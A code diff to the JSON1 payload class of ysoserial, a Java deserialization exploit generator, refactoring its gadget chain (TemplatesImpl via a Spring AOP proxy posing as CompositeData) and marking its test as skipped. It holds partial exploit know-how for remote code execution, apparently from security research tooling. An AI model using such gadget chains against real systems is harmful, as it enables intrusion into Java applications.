@@ -2,6 +2,7 @@ package ysoserial.payloads;
 
 
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
@@ -10,10 +11,8 @@ import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.InvocationTargetException;
 import java.util.HashMap;
 import java.util.Map;
-import java.util.TreeMap;
 
 import javax.management.openmbean.CompositeData;
-import javax.management.openmbean.CompositeDataSupport;
 import javax.management.openmbean.CompositeType;
 import javax.management.openmbean.OpenDataException;
 import javax.management.openmbean.OpenType;
@@ -23,7 +22,6 @@ import javax.management.openmbean.TabularType;
 import javax.xml.transform.Templates;
 
 import org.springframework.aop.framework.AdvisedSupport;
-import org.springframework.aop.target.SingletonTargetSource;
 
 import net.sf.json.JSONObject;
 
@@ -33,7 +31,7 @@ import net.sf.json.JSONObject;
  * A bit more convoluted example
  * 
  * com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()
- * java.lang.reflect.Method.invoke(Object, Object...) 
+ * java.lang.reflect.Method.invoke(Object, Object...)
  * org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(Object, Method, Object[])
  * org.springframework.aop.framework.JdkDynamicAopProxy.invoke(Object, Method, Object[])
  * $Proxy0.getOutputProperties()
@@ -68,6 +66,7 @@ import net.sf.json.JSONObject;
     "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2", "commons-lang:commons-lang:2.6", "net.sf.ezmorph:ezmorph:1.0.6",
     "commons-beanutils:commons-beanutils:1.9.2", "org.springframework:spring-core:4.1.4.RELEASE", "commons-collections:commons-collections:3.1"
 } )
+@PayloadTest(skip="This depends on HashMap ordering")
 public class JSON1 implements ObjectPayload<Object> {
 
     /**
@@ -98,14 +97,10 @@ public class JSON1 implements ObjectPayload<Object> {
         TabularDataSupport t1 = new TabularDataSupport(tt);
         TabularDataSupport t2 = new TabularDataSupport(tt);
 
-        CompositeDataSupport cds = Reflections.createWithoutConstructor(CompositeDataSupport.class);
-        Reflections.setFieldValue(cds, "compositeType", rt);
-        Reflections.setFieldValue(cds, "contents", new TreeMap());
-
         // we need to make payload implement composite data
         // it's very likely that there are other proxy impls that could be used
         AdvisedSupport as = new AdvisedSupport();
-        as.setTargetSource(new SingletonTargetSource(payload));
+        as.setTarget(payload);
         final CompositeData cdsProxy = Gadgets.createProxy(
             (InvocationHandler) Reflections.getFirstCtor("org.springframework.aop.framework.JdkDynamicAopProxy").newInstance(as),
             CompositeData.class,
